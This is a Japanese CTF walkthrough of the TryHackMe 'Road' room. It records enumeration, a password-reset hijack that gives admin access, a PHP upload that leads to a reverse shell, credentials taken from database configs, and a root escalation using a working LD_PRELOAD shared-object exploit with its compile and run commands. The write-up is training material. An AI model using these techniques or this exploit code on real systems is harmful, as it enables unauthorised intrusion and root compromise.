# Road CTF

https://tryhackme.com/room/road

## Enumeration

```shell
TARGET=10.201.51.242
sudo bash -c "echo $TARGET   skycouriers.thm >> /etc/hosts"
```

### ポートスキャン

```sh
root@ip-10-201-60-135:~# nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-22 01:11 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for road.thm (10.201.51.242)
Host is up (0.00029s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 16:FF:E9:07:3E:FB (Unknown)
```

```sh
root@ip-10-201-60-135:~# nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-22 01:12 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for road.thm (10.201.51.242)
Host is up (0.00011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 16:FF:E9:07:3E:FB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, HTTPのみ。

Webページには、info@skycouriers.thm というメールアドレスがある。

### サブドメイン、VHOST

特に出なかった。

```shell
$ ffuf -u http://skycouriers.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.skycouriers.thm' -fs 19607
```

### ディレクトリ列挙

```sh
root@ip-10-201-77-127:~# dirb http://$TARGET

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Sep 22 01:21:27 2025
URL_BASE: http://10.201.51.242/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.201.51.242/ ----
==> DIRECTORY: http://10.201.51.242/assets/                                                                                                                             
+ http://10.201.51.242/index.html (CODE:200|SIZE:19607)                                                                                                                 
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/                                                                                                                         
+ http://10.201.51.242/server-status (CODE:403|SIZE:278)                                                                                                                
==> DIRECTORY: http://10.201.51.242/v2/                                                                                              
---- Entering directory: http://10.201.51.242/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                               
---- Entering directory: http://10.201.51.242/phpMyAdmin/ ----
+ http://10.201.51.242/phpMyAdmin/ChangeLog (CODE:200|SIZE:41123)                                                                                                       
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/doc/                                                                                                                     
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/examples/                                                                                                                
+ http://10.201.51.242/phpMyAdmin/favicon.ico (CODE:200|SIZE:22486)                                                                                                     
+ http://10.201.51.242/phpMyAdmin/index.php (CODE:200|SIZE:19290)                                                                                                       
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/js/                                                                                                                      
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/libraries/                                                                                                               
+ http://10.201.51.242/phpMyAdmin/LICENSE (CODE:200|SIZE:18092)                                                                                                         
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/locale/                                                                                                                  
+ http://10.201.51.242/phpMyAdmin/README (CODE:200|SIZE:1520)                                                                                                           
+ http://10.201.51.242/phpMyAdmin/robots.txt (CODE:200|SIZE:26)                                                                                                         
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/sql/                                                                                                                     
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/templates/                                                                                                               
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/themes/                                                                                                                  
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/tmp/                                                                                                                     
==> DIRECTORY: http://10.201.51.242/phpMyAdmin/vendor/                                                                                          
---- Entering directory: http://10.201.51.242/v2/ ----
==> DIRECTORY: http://10.201.51.242/v2/admin/                                                                                                                           
+ http://10.201.51.242/v2/index.php (CODE:302|SIZE:20178)                                                                                       
---- Entering directory: http://10.201.51.242/phpMyAdmin/doc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                              
---- Entering directory: http://10.201.51.242/phpMyAdmin/examples/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                              
---- Entering directory: http://10.201.51.242/phpMyAdmin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                              
---- Entering directory: http://10.201.51.242/phpMyAdmin/libraries/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                               
---- Entering directory: http://10.201.51.242/phpMyAdmin/locale/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                               
---- Entering directory: http://10.201.51.242/phpMyAdmin/sql/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                              
---- Entering directory: http://10.201.51.242/phpMyAdmin/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                               
---- Entering directory: http://10.201.51.242/phpMyAdmin/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                
---- Entering directory: http://10.201.51.242/phpMyAdmin/tmp/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.51.242/phpMyAdmin/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.51.242/v2/admin/ ----
+ http://10.201.51.242/v2/admin/index.php (CODE:200|SIZE:32)-----------------
END_TIME: Mon Sep 22 01:21:37 2025
DOWNLOADED: 18448 - FOUND: 10
```

/v2 ディレクトリが見つかる。

## v2

/v2 でログイン画面が表示され、ユーザー登録後にログインできる。

`Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes.` から管理者アドレス判明。

パスワードリセット機能で、Burpでインターセプトし、メールアドレスの部分を管理者アドレス`admin@sky.thm`に変更することでパスワード変更でき、管理者としてログインできた。

profile.php のHTMLソースに次の記述がある。

```html
<!-- /v2/profileimages/ -->
```

プロフィール画像アップロード機能で任意のPHPをアップロードでき、上記のディレクトリに保存される。

シェル取得成功。

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.33.242] 45968
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 05:58:36 up 17 min,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

## 権限昇格１

mysqlの接続情報を発見。

```php
www-data@sky:/var/www/html/v2/admin$ cat reg.php
<?php
$username = filter_input(INPUT_POST, 'User_Email');
$password = filter_input(INPUT_POST, 'User_Pass');
$contact = filter_input(INPUT_POST, 'Us_Cont');
if (!empty($username)){
if (!empty($password)){
$host = "localhost";
$dbusername = "root";
$dbpassword = "ThisIsSecurePassword!";
$dbname = "SKY";
// Create connection
$conn = new mysqli ($host, $dbusername, $dbpassword, $dbname);
```

mysql に接続したが、既知の情報しか入っていなかった。

```sh
mysql> select * from Users;
+----+---------------+----------+------------+
| id | username      | password | phone      |
+----+---------------+----------+------------+
|  2 | admin@sky.thm | thmthm   | 5486214569 |
|  7 | thm@sky.thm   | thmthm   | 1234567890 |
+----+---------------+----------+------------+
```

mongoに接続。mongoコマンドを実行するだけで、接続情報の入力は不要。

```sh
> show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB

> use backup
```

webdeveloperのパスワードが入っていた。suコマンドで切り替え可能になった。

```
> db.user.find().pretty()
{
        "_id" : ObjectId("60ae2661203d21857b184a76"),
        "Month" : "Feb",
        "Profit" : "25000"
}
{
        "_id" : ObjectId("60ae2677203d21857b184a77"),
        "Month" : "March",
        "Profit" : "5000"
}
{
        "_id" : ObjectId("60ae2690203d21857b184a78"),
        "Name" : "webdeveloper",
        "Pass" : "[REDACTED]"
}
{
        "_id" : ObjectId("60ae26bf203d21857b184a79"),
        "Name" : "Rohit",
        "EndDate" : "December"
}
{
        "_id" : ObjectId("60ae26d2203d21857b184a7a"),
        "Name" : "Rohit",
        "Salary" : "30000"
}
```

## 権限昇格２

/usr/bin/sky_backup_utility を sudo で実行できる。

```sh
www-data@sky:/var/www/html/v2/admin$ su webdeveloper
Password: 
webdeveloper@sky:/var/www/html/v2/admin$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

リバース。tarが絶対パスではないことや、ワイルドカードが使われていることに注意が引かれたが、この場合は悪用できなかった。

- env_reset で PATH がリセットされている。
- `*` ではなく `/var/www/html/*` という形のワイルドカードであるため、tarのコマンドラインオプションとして偽装することができない。

```c
bool main(void)
{
  int iVar1;
  
  puts("Sky Backup Utility");
  puts("Now attempting to backup Sky");
  iVar1 = system("tar -czvf /root/.backup/sky-backup.tar.gz /var/www/html/*");
  if (iVar1 == 0) {
    puts("Backup successful!");
  }
  else {
    printf("Backup failed!\nCheck your permissions!");
  }
  return iVar1 != 0;
}
```

本当の脆弱性は、env_keep+=LD_PRELOAD が指定されている点。  

エクスプロイトコード

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash -p");
}
```

コンパイル

```sh
webdeveloper@sky:~$ gcc -fPIC -shared -o /tmp/x.so poc.c -nostartfiles
poc.c: In function ‘hijack’:
poc.c:8:9: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    8 |         setgid(0);
      |         ^~~~~~
poc.c:9:9: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    9 |         setuid(0);
      |
```

実行

```sh
webdeveloper@sky:~$ sudo LD_PRELOAD=/tmp/x.so /usr/bin/sky_backup_utility
root@sky:/home/webdeveloper# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- ファイルアップロードのディレクトリを発見するのが難しかった
- mongo は良い経験になった
